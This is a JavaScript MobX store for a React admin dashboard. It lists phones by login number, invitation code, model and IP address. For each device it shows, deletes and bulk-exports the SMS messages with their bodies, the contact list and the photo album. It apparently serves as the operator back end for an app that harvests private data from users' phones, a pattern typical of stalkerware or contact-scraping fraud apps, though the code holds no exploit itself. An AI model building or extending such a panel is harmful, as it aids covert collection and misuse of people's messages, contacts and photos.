import React from "react"
import { observable, action, runInAction } from "mobx";
import { getdevice, getshebeiduanxinlist, deleteshebeiduanxin, deleteduanxin, getcoms, deleteshebeialltongxunlu, deletetongxunlu, getexcel, addouttongxunlu, addoutduanxin, deleteallshebei, deleteshebei, onsearch, deletetongxunluall, deleteallduanxin, deleteuser, getphoto, deletephoto, deleteallphoto, downpic } from "../../api/login";
import { message } from "antd"
import moment from "moment"

import ExportJsonExcel from 'js-export-excel';

class Device {
    @observable dataSource = [];//设备列表数据
    @observable dataSource_duanxinmodal = [];//短信列表模态框列表数据
    @observable dataSource_tongxunlumodal = [];//通讯录模态框列表数据
    @observable visible = false;//短信模态框的状态
    @observable visible1 = false;//通讯录模态框的状态
    @observable visible2 = false;//相册模态框的状态
    @observable wid = '';//单条设备的id
    @observable deletemodal = false;//删除模态框状态
    @observable sid = "";//保存设备短信列表的单条短信
    @observable params = {};//保存调用删除方法传过来的类型和ID
    @observable loading = false;//loading
    @observable photodatasource = [];//保存相册数据


    //===========Navleft=====================
    @observable list = [];//保存navleft菜单列表
    @observable collapsed = false;//保存navleft菜单的收缩
    @observable SelectedKeys = ["1"];//保存选中数据

    //获取设备列表数据
    @action getshebeilist = () => {
        this.loading = true
        getdevice({ curPage: 1, pageSize: 10 }).then(res => {
            if (res.code == 200) {
                this.loading = false
                res.data.forEach(element => {
                    element.key = element.pid
                });
                this.dataSource = res.data
            }
        })
    }

    //显示查看短信模态框
    @action showduanxinmodal = (id) => {
        this.wid = id
        this.visible = true
    }

    //关闭短信模态框
    @action closemodal = () => {
        this.visible = false
        this.wid = ""
    }
    //显示通讯录模态框
    @action showtongxunlumodal = (id) => {
        this.wid = id
        this.visible1 = true
    }

    //关闭通讯录模态框
    @action closetongxunlumodal = () => {
        this.visible1 = false
        this.wid = ""
    }

    //获取设备短信列表
    @action getshebeiduanxinlist = () => {
        this.loading = true
        getshebeiduanxinlist({ wid: this.wid, curPage: 1, pageSize: 10 }).then(res => {
            if (res.code == 200) {
                this.loading = false
                res.data.forEach(element => {
                    element.key = element.sid
                });
                this.dataSource_duanxinmodal = res.data

            }
        })
    }
    //控制删除模态框显示
    @action deletemodalshow = (params) => {
        this.deletemodal = true
        this.params = params

    }
    //关闭删除模态框
    @action closedeletemodal = () => {
        this.deletemodal = false
        this.params = {}
    }
    //删除模态框确定方法
    @action deletemodalonok = (callback) => {
        switch (this.params.type) {
            case "deleteshebeiduanxin":
                this.deleteshebeiduanxin()
                break;
            case "deleteduanxin":
                this.deleteduanxin(callback);
                break;
            case "deleteshebeitongxunlu":
                this.deleteshebeitongxunlu();
                break;
            case "deletetongxunlu":
                this.deletetongxunlu(callback);

                break;
            case "deleteallshebei":
                this.deleteallshebei();

                break;
            case "deleteshebei":
                this.deleteshebei();
                break;
            case "deletealltongxunlu":
                this.deletealltongxunlu(callback);
                break;
            case "deleteallduanxin":
                this.deleteallduanxin(callback)
                break;
            case "deleteuser":
                this.deleteuser(callback);
                break;
            case "deletepic":
                this.deletephoto();
                break;
            case "deleteallphoto":
                this.deleteallphoto();
                break;
            default:
                break;
        }
    }

    //删除设备全部短信
    @action deleteshebeiduanxin = () => {
        deleteshebeiduanxin({ wid: this.wid }).then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal();
                this.getshebeiduanxinlist();
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //删除设备单条短信
    @action deleteduanxin = (callback) => {
        deleteduanxin({ sid: this.params.id }).then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal();
                callback ? callback() : this.getshebeiduanxinlist();

            } else {
                message.error("删除失败")
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //获取通讯录列表
    @action getshebeitongxunlulist = () => {
        this.loading = true
        getcoms({ curPage: 1, pageSize: 10, wid: this.wid }).then(res => {
            if (res.code == 200) {

                this.loading = false
                res.data.forEach(element => {
                    element.key = element.uid
                });
                this.dataSource_tongxunlumodal = res.data

            }
        }).catch(err => {
            console.log(err)
        })
    }

    //删除设备全部通讯录
    @action deleteshebeitongxunlu = () => {
        deleteshebeialltongxunlu({ wid: this.wid }).then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal();
                this.getshebeitongxunlulist();
            }
        }).catch(err => {
            console.log(err)
        })
    }

    //删除设备单条通讯录
    @action deletetongxunlu = (callback) => {
        deletetongxunlu({ uid: this.params.id }).then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal();

                callback ? callback() : this.getshebeitongxunlulist();
            } else {
                message.error("删除失败")
            }
        }).catch(err => {
            console.log(err)
        })
    }

    //导出excel表
    @action getexcel = () => {
        getexcel().then(res => {
            if (res.code == 200) {
                const data = res.data  // 准备的数据
                var option = {}
                let dataTable = []
                if (data) {
                    for (let i in data) {
                        if (data) {
                            let obj = {
                                '登录手机': data[i].phone,  // '列名': 数据
                                '邀请码': data[i].Invitation,
                                '登录时间': moment(Number(data[i].time * 1000)).format('DD/MM/YYYY'),
                                '手机型号': data[i].phonemodel,
                                'ip地址': data[i].ipcofig,
                            }
                            dataTable.push(obj);
                        }
                    }
                }

                option.fileName = '设备列表'  //导出的Excel文件名
                option.datas = [
                    {
                        sheetData: dataTable,
                        sheetName: 'sheet',
                        sheetFilter: ['登录手机', '邀请码', '登录时间', "手机型号", 'ip地址'],
                        sheetHeader: ['登录手机', '邀请码', '登录时间', "手机型号", 'ip地址'],
                        columnWidths: [10, 10, 10, 10, 10]
                    }
                ]

                var toExcel = new ExportJsonExcel(option);
                toExcel.saveExcel();
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //导出通讯录
    @action addoutshebeitongxunlu = (wid, phone) => {
        addouttongxunlu({ wid }).then(res => {
            if (res.code == 200) {
                const data = res.data  // 准备的数据
                var option = {}
                let dataTable = []
                if (data) {
                    for (let i in data) {
                        if (data) {
                            let obj = {
                                '通讯录号码': data[i].phone,  // '列名': 数据
                                '联系人': data[i].contact,

                            }
                            dataTable.push(obj);
                        }
                    }
                }

                option.fileName = `${phone}-通讯录列表` //导出的Excel文件名
                option.datas = [
                    {
                        sheetData: dataTable,
                        sheetName: 'sheet',
                        sheetFilter: ['通讯录号码', '联系人'],
                        sheetHeader: ['通讯录号码', '联系人'],
                        columnWidths: [10, 10]
                    }
                ]

                var toExcel = new ExportJsonExcel(option);
                toExcel.saveExcel();
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //导出短信列表
    @action addoutshebeiduanxin = (wid, phone) => {
        addoutduanxin({ wid }).then(res => {
            if (res.code == 200) {
                const data = res.data  // 准备的数据
                var option = {}
                let dataTable = []
                if (data) {
                    for (let i in data) {
                        if (data) {
                            let obj = {
                                '短信发送时间': data[i].Dates,  // '列名': 数据
                                '短信号码': data[i].PhoneNumber,
                                '短信内容': data[i].Smsbody,

                            }
                            dataTable.push(obj);
                        }
                    }
                }

                option.fileName = `${phone}-短信列表` //导出的Excel文件名
                option.datas = [
                    {
                        sheetData: dataTable,
                        sheetName: 'sheet',
                        sheetFilter: ['短信发送时间', '短信号码', '短信内容'],
                        sheetHeader: ['短信发送时间', '短信号码', '短信内容'],
                        columnWidths: [10, 10, 10]
                    }
                ]

                var toExcel = new ExportJsonExcel(option);
                toExcel.saveExcel();
            }
        }).catch(err => {
            console.log(err)
        })
    }

    //删除全部设备
    @action deleteallshebei = () => {
        deleteallshebei().then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal();
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //删除单条设备
    @action deleteshebei = () => {
        deleteshebei({ pid: this.params.pid }).then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal()
                this.getshebeilist()
            }
        }).catch(err => {
            console.log(err)
        })
    }

    //搜索框
    @action onSearch = (val) => {
        onsearch({ content: val }).then(res => {
            if (res.code == 200) {
                res.data.forEach(element => {
                    element.key = element.pid
                });
                this.dataSource = res.data
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //清空所有通讯录
    @action deletealltongxunlu = (callback) => {
        deletetongxunluall().then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal()
                callback && callback();
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //清空所有短信
    @action deleteallduanxin = (callback) => {
        deleteallduanxin().then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal()
                callback && callback();
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //删除用户
    @action deleteuser = (callback) => {
        deleteuser({ uid: this.params.id }).then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal()
                callback && callback()
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //控制相册查看模态框显示
    @action showphotomodal = (id) => {
        this.visible2 = true
        this.wid = id
    }
    //关闭相册查看模态框
    @action closephotomodal = () => {
        this.visible2 = false
        this.wid = ""
    }
    //获取相册列表数据
    @action getphoto = () => {
        // debugger;
        this.loading=true
        getphoto({ curPage: 1, pageSize: 10, wid: this.wid }).then(res => {
            if (res.code == 200) {
                this.loading=false
                res.data.forEach(element => {
                    element.key = element.sid
                });
                this.photodatasource = res.data
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //删除单张照片
    @action deletephoto = () => {
        deletephoto({ sid: this.params.id }).then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal()
                this.getphoto()
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //清空相册
    @action deleteallphoto = () => {
        deleteallphoto({ wid: this.wid }).then(res => {
            if (res.code == 200) {
                message.success("删除成功")
                this.closedeletemodal()
                this.getphoto()
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //导出相册
    @action downpic = (wid, phone) => {
        downpic({ wid, phone }).then(res => {
            if (res.code == 200) {
                window.location.href = `${React.$url}${res.url}`
            }
        }).catch(err => {
            console.log(err)
        })
    }
    //查看缓存里是否有选中的key
    @action searchkey = () => {
        if (sessionStorage.getItem("SelectedKeys") && sessionStorage.getItem("SelectedKeys").length > 0) {
            this.SelectedKeys = JSON.parse(sessionStorage.getItem("SelectedKeys"))
        }
    }
    //获取list列表
    @action getmenulist = () => {
        this.list = JSON.parse(sessionStorage.getItem("menulist"))

    }
    //控制菜单收缩
    @action onCollapse = collapsed => {
        this.collapsed = collapsed
    };
    //控制菜单选中
    @action  onSelect=(item,key)=>{    
            this.SelectedKeys=item.selectedKeys
        sessionStorage.setItem("SelectedKeys",JSON.stringify(item.selectedKeys))
    }
}
export default Device;















